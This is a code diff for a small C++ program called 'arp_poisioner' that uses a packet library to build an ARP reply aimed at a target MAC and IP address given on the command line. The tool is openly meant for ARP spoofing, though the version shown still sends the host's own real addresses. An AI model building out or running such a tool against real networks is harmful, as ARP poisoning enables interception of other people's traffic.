@@ -5,23 +5,28 @@ using namespace std;
 
 int main(int argc, char* argv[])
 {
-    if(argc < 2) {
-        cerr << "Usage: arp_poisioner INTERFACE" << endl;
+    if(argc < 4) {
+        cerr << "Usage: arp_poisioner [interface] [tha] [tsa]" << endl;
         return 1;
     }
 
-    const std::string iface = argv[1];
+    const std::string iface      = argv[1];
+    const std::string target_mac = argv[2];
+    const std::string target_ip  = argv[3];
 
     cyanid::device device(iface);
+
     cyanid::basic_mac_addr* mac_addr = device.get_mac();
     cyanid::ip_addr ip_addr = device.get_ip();
 
-    const std::string source_mac(cyanid::utils::addr_to_mac(mac_addr));
-    const std::string source_ip(cyanid::utils::addr4_to_ip(ip_addr));
+    const std::string source_mac(cyanid::utils::mac_to_str(mac_addr));
+    const std::string source_ip(cyanid::utils::addr4_to_str(ip_addr));
 
     cout << "Using interface: " << iface << endl
-         << "MAC addr:        " << source_mac << endl
-         << "IP addr:         " << source_ip << endl;
+         << "Source MAC addr: " << source_mac << endl
+         << "Source IP addr:  " << source_ip << endl
+         << "Target MAC add:  " << target_mac << endl
+         << "Target IP addr:  " << target_ip << endl;
 
     cyanid::packet packet(device);
 
@@ -29,11 +34,11 @@ int main(int argc, char* argv[])
             cyanid::builder::arp::REPLY,
             source_mac,
             source_ip,
-            "00:00:00:00:00:00",
-            "192.168.1.1");
+            target_mac,
+            target_ip);
 
     packet.build<cyanid::builder::ethernet>()(
-            "00:00:00:00:00:00",
+            target_mac,
             cyanid::builder::arp::ETHER_TYPE);
 
     size_t bytes_written = packet.dispatch();
